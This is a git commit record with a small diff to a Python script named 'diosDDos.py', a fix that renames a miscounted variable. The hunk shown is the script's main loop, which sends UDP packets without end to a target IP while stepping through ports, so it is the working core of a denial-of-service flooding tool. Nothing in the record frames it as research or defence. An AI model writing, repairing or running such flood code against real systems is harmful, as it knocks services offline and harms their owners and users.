7af3f9fa18f8e3e536d4e20dbc8aaec1a9535192
DiosDeLaWeb <102493959+DiosDeLaWeb@users.noreply.github.com>
2022-04-01 17:20:57 -0300

    Update diosDDos.py

--- diosDDos.py
+++ diosDDos.py
@@ -47,7 +47,7 @@ time.sleep(3)
 sent = 0
 while True:
     sock.sendto(bytes, (ip,port))
-    send = send + 1
+    sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
